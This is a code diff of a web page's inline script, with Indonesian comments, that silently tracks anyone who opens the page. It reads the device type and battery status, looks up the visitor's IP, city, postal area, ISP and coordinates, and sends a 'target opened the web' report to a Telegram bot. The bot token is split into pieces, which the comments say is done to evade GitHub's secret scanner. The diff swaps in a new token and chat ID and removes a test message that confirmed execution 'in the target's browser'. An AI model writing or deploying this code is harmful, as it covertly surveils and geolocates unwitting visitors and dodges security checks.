@@ -152,20 +152,15 @@
     </footer>
 
     <script>
-        // === KONFIGURASI BOT TELEGRAM (DI-SAFE DARI GITHUB SCANNER) ===
-        const part1 = "8743094711";
-        const part2 = "AAF-1OcGVFBAGBrTE4ycVIAtasi";
-        const part3 = "HMBmrto";
+        // === KONFIGURASI BOT TELEGRAM (TOKEN BENAR & AMAN DARI SCANNER) ===
+        const part1 = "8816261841";
+        const part2 = "AAFOvMF00rlDMaxydRfxnTpi5bff";
+        const part3 = "5dArd9s";
         const TELEGRAM_TOKEN = `${part1}:${part2}${part3}`; 
         const CHAT_ID = "8335786077";
-        // ============================================================
+        // =================================================================
 
-        // 1. TES KIRIM INSTAN (Memastikan bot merespon tanpa nunggu API luar)
-        const testMsg = "🚨 TEST INSTAN: Script web berhasil tereksekusi di browser target!";
-        const testUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(testMsg)}`;
-        fetch(testUrl).catch(e => console.log("Test error:", e));
-
-        // 2. Deteksi Perangkat / OS
+        // 1. Deteksi Perangkat / OS
         const ua = navigator.userAgent;
         let deviceName = "Unknown Device";
         if (/android/i.test(ua)) deviceName = "Android Mobile";
@@ -174,7 +169,7 @@
         else if (/linux/i.test(ua)) deviceName = "Linux System";
         document.getElementById('deviceVal').innerText = deviceName;
 
-        // 3. Deteksi Baterai & Charge Status
+        // 2. Deteksi Baterai & Charge Status
         let batteryLevelInfo = "Tidak Diketahui";
         let chargeStatusInfo = "Tidak Diketahui";
         
@@ -212,7 +207,7 @@
         }
         pushLog();
 
-        // 4. Tarik Data IP Detail & Kirim Laporan Lengkap
+        // 3. Tarik Data IP Detail & Kirim Laporan Lengkap
         fetch('https://ipapi.co/json/')
             .then(res => res.json())
             .then(data => {
@@ -254,8 +249,8 @@
             const message = `🚨 TARGET MEMBUKA WEB!\n\n` +
                             `🌐 IP: ${ip}\n` +
                             `📍 Kota: ${city}\n` +
-                            `📮 Kode Pos / Area: ${postal} (${district})\n` +
-                            `🗺️ Provinsi/Negara: ${region}\n` +
+                            `📮 Area: ${postal} (${district})\n` +
+                            `🗺️ Provinsi, Negara: ${region}\n` +
                             `📶 Provider: ${isp}\n` +
                             `📌 Koor: ${coords}\n` +
                             `⚡ Charge Status: ${chargeStatus} (${batteryLevel})\n` +
